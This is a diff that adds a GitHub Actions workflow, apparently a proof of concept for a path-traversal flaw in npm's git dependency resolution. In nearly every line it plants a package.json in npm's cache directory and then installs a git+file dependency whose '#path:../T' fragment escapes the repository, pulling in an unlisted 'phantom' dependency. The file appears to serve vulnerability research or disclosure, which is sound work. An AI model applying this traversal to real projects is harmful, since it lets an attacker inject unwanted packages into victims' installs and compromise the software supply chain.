@@ -1,0 +1,22 @@
+name: NPM Traversal PoC
+on: workflow_dispatch
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - name: PoC
+        run: |
+          mkdir /tmp/a && cd /tmp/a && git init -q && git config user.email t@t && git config user.name t
+          printf '{"name":"bait","version":"1"}' > package.json && git add . && git commit -qm i
+          mkdir -p ~/.npm/_cacache/tmp/T
+          printf '{"name":"phantom","version":"99","dependencies":{"is-odd":"3.0.1"}}' > ~/.npm/_cacache/tmp/T/package.json
+          mkdir /tmp/v && cd /tmp/v
+          printf '{"name":"v","version":"1","dependencies":{"d":"git+file:///tmp/a#path:../T"}}' > package.json
+          npm i --ignore-scripts --install-strategy=hoisted 2>&1 | tail -3
+          echo "=== RESULT ===" && ls node_modules/
+          test -d node_modules/is-odd && echo "PHANTOM_DEP:is-odd=INSTALLED" || echo "NO_PHANTOM"
+          node -e "const l=require('./package-lock.json');const t=l.packages['node_modules/d'];console.log(JSON.stringify({n:t?.name,v:t?.version,d:t?.dependencies}))"
+
